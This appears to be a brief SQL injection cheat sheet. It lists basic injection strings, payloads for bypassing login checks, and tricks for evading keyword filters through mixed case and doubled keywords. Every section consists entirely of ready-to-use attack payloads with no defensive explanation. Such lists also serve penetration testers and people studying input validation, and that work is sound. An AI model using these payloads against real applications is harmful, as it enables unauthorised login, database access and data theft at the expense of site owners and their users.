### Basic
```sql
select 1
union select 1,2,3
or 1=1
' or '1'='1
```

### Bypass Login Function
```sql
' or 1=1 -- -
' or (select 1) -- -
```

### Bypass SQL Keywords Removal
```sql
uNiOn SeLEct 1,2,3
uniunionon selselectect 1,3,4,5,6
```